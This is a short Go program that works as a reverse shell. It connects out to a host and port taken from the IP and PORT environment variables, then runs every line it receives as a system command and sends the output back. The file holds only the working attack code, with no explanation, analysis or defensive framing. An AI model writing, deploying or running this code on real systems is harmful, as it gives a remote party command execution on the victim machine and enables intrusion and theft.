package main

import (
    "bufio"
    "fmt"
    "net"
    "os/exec"
    "os"
    "strings"
)

func main() {
    ip, isset_ip := os.LookupEnv("IP")
    port, isset_port := os.LookupEnv("PORT")

    if !isset_ip { fmt.Println("'IP' is not set as env variable"); return; }
    if !isset_port { fmt.Println("'PORT' is not set as env variable"); return; }

    conn, err := net.Dial("tcp", ip + ":" + port)
    if err != nil { fmt.Println("Invalid IP/PORT format"); return; }

    for {
        message, _ := bufio.NewReader(conn).ReadString('\n')
        out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
        if err != nil { fmt.Fprintf(conn, "%s\n",err) }
        fmt.Fprintf(conn, "%s\n",out)
    }
}
